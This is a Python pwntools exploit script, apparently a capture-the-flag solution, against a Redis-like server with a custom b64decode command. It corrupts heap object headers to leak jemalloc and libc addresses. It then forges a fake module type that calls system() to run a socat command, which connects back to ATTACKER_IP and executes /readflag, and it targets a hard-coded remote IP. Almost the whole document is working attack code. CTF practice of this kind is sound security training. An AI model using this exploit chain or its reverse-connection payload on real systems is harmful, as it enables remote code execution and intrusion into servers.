#!/usr/bin/env python3

from pwn import *
from base64 import b64encode as b64e
from ast import literal_eval

#context.log_level = 'debug'
context.arch = 'amd64'

libc = ELF('./libc-2.31.so')

DEBUG = False

if DEBUG:
    p = remote('127.0.0.1', 9000)
else:
    p = remote('114.203.209.118', 2)


p.sendlineafter('> ', 'set dec ' + 'dec_'.ljust(0x20, 'A'))  # 0x5f636564 (embstr)
p.sendlineafter('> ', 'set b64 AAAA')
p.sendlineafter('> ', 'b64decode b64 dec')  # this converts embstr -> raw!!
p.sendlineafter('> ', 'set tgt ' + 'tgt_'.ljust(0x10, 'B'))  # 0x5f746774 (embstr)

# now layout is: dec->ptr | tgt's robj & embstr

payload  = b''
payload += b'A'*0x25
payload += p8(0x10)  # type & encoding
p.sendlineafter('> ', b'set b64 ' + b64e(payload))
p.sendlineafter('> ', 'b64decode b64 dec')  # overwrite tgt_robj->encoding=OBJ_ENCODING_INT
p.sendlineafter('> ', 'get tgt')
tgt_ptr = int(literal_eval(p.recvuntil('\n> ', True).decode()))
p.unrecv('> ')

log.info   (f'{tgt_ptr        = :#014x}')
jemalloc_base = tgt_ptr - 0x41d53b
assert jemalloc_base & 0xfffff == 0
log.success(f'{jemalloc_base  = :#014x}')

# leak libc address
fake_sds = tgt_ptr - 3 + 9
payload  = b''
payload += b'A'*0x25
payload += p8(0x00) + b'AAA' + p32(1)               # type & encoding | LRU | refcnt
payload += p64(fake_sds)                            # ptr
payload += p32(0x200000) + p32(0x200000) + p8(0x3)  # sdshdr32
p.sendlineafter('> ', b'set b64 ' + b64e(payload))
p.sendlineafter('> ', 'b64decode b64 dec')

p.sendlineafter('> ', 'get tgt')
leak = literal_eval(p.recvuntil('\n> ', True).decode())
p.unrecv('> ')
anon_6000_base = u64(leak[0x1e5c4f:0x1e5c4f+0x8]) - 0xcf8
assert anon_6000_base & 0xfff == 0
log.success(f'{anon_6000_base = :#014x}')
libc.address = anon_6000_base + 0x6000
log.info   (f'{libc.address   = :#014x}')

fake_moduleValue = tgt_ptr - 3
fake_moduleType  = fake_moduleValue + 0x10
cmd              = fake_moduleType + 0x90
ret = libc.address + 0x253a7
payload  = b''
payload += b'A'*0x25
payload += p8(0x05) + b'AAA' + p32(1)       # type & encoding | LRU | refcnt
payload += p64(fake_moduleValue)            # ptr
payload += p64(fake_moduleType) + p64(cmd)  # fake_moduleValue
payload += p64(ret)*7 + p64(libc.sym['system']) + p64(ret)*10  # fake_moduleType (only leading 0x90 bytes)
payload += b'socat tcp:ATTACKER_IP:65432 EXEC:"/readflag",stderr\0'  # listen on this IP:PORT!
p.sendlineafter('> ', b'set b64 ' + b64e(payload))

l = listen(65432, '0.0.0.0')
p.sendlineafter('> ', 'b64decode b64 dec')  # overwrite tgt_robj->encoding=OBJ_ENCODING_INT
p.sendlineafter('> ', 'set tgt 0')          # remove tgt fake module, trigger RCE
print(l.wait_for_connection().recvall())

# WACon{i-think-i-left-a-vulnerablity-hmm:thonk:}
